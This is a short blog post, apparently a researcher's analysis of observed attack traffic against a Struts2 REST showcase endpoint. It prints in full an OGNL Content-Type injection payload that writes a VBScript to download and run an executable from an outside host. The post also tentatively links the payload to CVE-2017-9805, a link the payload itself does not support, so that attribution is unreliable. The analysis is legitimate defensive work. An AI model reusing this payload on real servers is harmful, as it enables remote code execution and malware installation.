---
title: "Attack Targeting struts2-rest-showcase"
#author: "Author Name"
description: "Description of an attack targeting a web endpoint and dropping a downloader using VisualBasic script"
#cover: "/img/cover.jpg"
#tags: ["tagA", "tagB"]
date: 2018-06-24T14:14:14-04:00
draft: false
---
I see some interesting exploitation over port 80 to struts2-rest-showcase/orders.xhtml:

```
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cmd /c del C:/Windows/temp/searsvc.vbs&echo Set Post = CreateObject("Msxml2.XMLHTTP") >>C:/Windows/temp/searsvc.vbs&echo Set Shell = CreateObject("Wscript.Shell") >>C:/Windows/temp/searsvc.vbs&echo Post.Open "GET","hxxp://a46.bulehero.in/downloader.exe",0 >>C:/Windows/temp/searsvc.vbs&echo Post.Send() >>C:/Windows/temp/searsvc.vbs&echo Set aGet = CreateObject("ADODB.Stream") >>C:/Windows/temp/searsvc.vbs&echo aGet.Mode = 3 >>C:/Windows/temp/searsvc.vbs&echo aGet.Type = 1 >>C:/Windows/temp/searsvc.vbs&echo aGet.Open() >>C:/Windows/temp/searsvc.vbs&echo aGet.Write(Post.responseBody) >>C:/Windows/temp/searsvc.vbs&echo aGet.SaveToFile "C:/Windows/temp/esentur.exe",2 >>C:/Windows/temp/searsvc.vbs&echo wscript.sleep 10000>>C:/Windows/temp/searsvc.vbs&echo Shell.Run ("C:/Windows/temp/esentur.exe")>>C:/Windows/temp/searsvc.vbs&C:/Windows/temp/searsvc.vbs').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

It looks like this is abusing some mishandling of a content type, to write a vbs script that downloads hxxp://a46.bulehero.in/downloader.exe into C:/Windows/temp/esentur.exe.  Unfortunately, that site is not providing the download file...

[Virus total](https://www.virustotal.com/#/file/a65c5009bf998ec560b9f93928a7a365ffdaceeaca3cc547bec971a1f76e7b11/detection) has previously characterized a downloader.exe file from the URL.

This seems like it exploits [CVE-2017-9805](https://nvd.nist.gov/vuln/detail/CVE-2017-9805), with potential [POC here](https://github.com/iBearcat/S2-052).
